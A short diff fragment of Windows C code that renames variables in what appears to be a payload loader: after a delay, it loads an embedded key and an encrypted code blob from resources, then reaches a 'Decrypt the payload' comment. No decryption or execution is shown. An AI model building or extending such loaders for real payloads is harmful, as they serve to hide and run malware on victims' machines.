@@ -25,12 +25,12 @@ int main() {
     Sleep(2000);
 
     
-    char* dank1e6ENC;
-    DWORD dank1e6ENCLen;
+    char* key101k;
+    DWORD key101kLen;
     ooooloadrekusigma("dhanushkey1", &key101k, &key101kLen);
 
-    char* codfhu;
-    DWORD codfhuLen;
+    char* code199k;
+    DWORD code199kLen;
     ooooloadrekusigma("dhanushcode56", &code199k, &code199kLen);
 
     // Decrypt the payload
